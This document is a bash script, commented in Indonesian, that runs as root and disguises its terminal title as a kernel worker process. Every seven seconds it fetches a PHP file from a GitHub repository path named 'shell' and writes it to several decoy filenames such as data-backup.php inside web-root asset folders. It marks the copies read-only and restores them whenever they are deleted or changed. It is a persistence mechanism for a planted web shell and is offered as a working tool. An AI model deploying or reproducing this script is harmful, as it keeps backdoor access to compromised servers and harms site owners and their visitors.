#!/bin/bash

# ===============================
# FILE WATCHER DAN AUTO-DOWNLOAD
# ===============================

# Cek apakah dijalankan sebagai root
if [[ "$EUID" -ne 0 ]]; then
    echo "Script ini harus dijalankan sebagai root."
    exit 1
fi

# Meniru nama proses (opsional, hanya kosmetik)
echo -ne "\033]0;[kworker/1:0]\007"

# Daftar file yang dipantau
FILES=(
    "/var/www/html/public/video/data-backup.php"
    "/var/www/html/public/dokumen/berkas/data-data.php"
    "/var/www/html/public/assets/e-learning/scss/bootstrap/scss/forms/data-backup.php"
    "/var/www/html/public/assets/berry/css/plugins/themes/data-data.php"
)

# URL file sumber
URL="https://raw.githubusercontent.com/kennn403/shell/refs/heads/main/cax.php"

# Fungsi untuk mengunduh file
download_file() {
    local file_path="$1"
    echo "Mengunduh file: $file_path"

    content=$(curl -fsSL "$URL")
    if [[ $? -ne 0 || -z "$content" ]]; then
        echo "Gagal mengunduh file: $file_path. Periksa koneksi atau URL."
        return
    fi

    echo "$content" > "$file_path"
    chmod 444 "$file_path"
    chown 1000:1000 "$file_path" || echo "Gagal chown $file_path"
    echo "✔️  Berhasil mengunduh dan menyimpan file: $file_path"
}

# Fungsi untuk menghitung hash file
get_file_hash() {
    [[ -f "$1" ]] && md5sum "$1" | awk '{ print $1 }' || echo ""
}

# Fungsi untuk mengatur permission direktori
set_permissions() {
    local dir_path="$1"
    while [[ "$dir_path" != "/var/www/html" && "$dir_path" != "/" ]]; do
        chmod 755 "$dir_path"
        dir_path=$(dirname "$dir_path")
    done
}

# Loop utama
while true; do
    for file in "${FILES[@]}"; do
        dir_path=$(dirname "$file")

        # Buat direktori jika belum ada
        if [[ ! -d "$dir_path" ]]; then
            mkdir -p "$dir_path"
            echo "📁 Membuat direktori: $dir_path"
        fi

        # Atur izin direktori
        set_permissions "$dir_path"

        # Periksa dan unduh file jika perlu
        if [[ ! -f "$file" ]]; then
            download_file "$file"
        else
            original_hash=$(get_file_hash "$file")
            temp_file=$(mktemp)
            curl -fsSL "$URL" > "$temp_file"
            current_hash=$(md5sum "$temp_file" | awk '{ print $1 }')

            if [[ "$original_hash" != "$current_hash" ]]; then
                echo "🔁 File berubah, mengunduh ulang: $file"
                mv "$temp_file" "$file"
                chmod 444 "$file"
                chown 1000:1000 "$file" || echo "Gagal chown $file"
            else
                rm "$temp_file"
            fi
        fi
    done

    # Pastikan file selalu dimiliki oleh 1000:1000
    for file in "${FILES[@]}"; do
        if [[ -f "$file" ]]; then
            chown 1000:1000 "$file" || echo "Gagal chown $file (pasca-loop)"
        fi
    done

    sleep 7
done
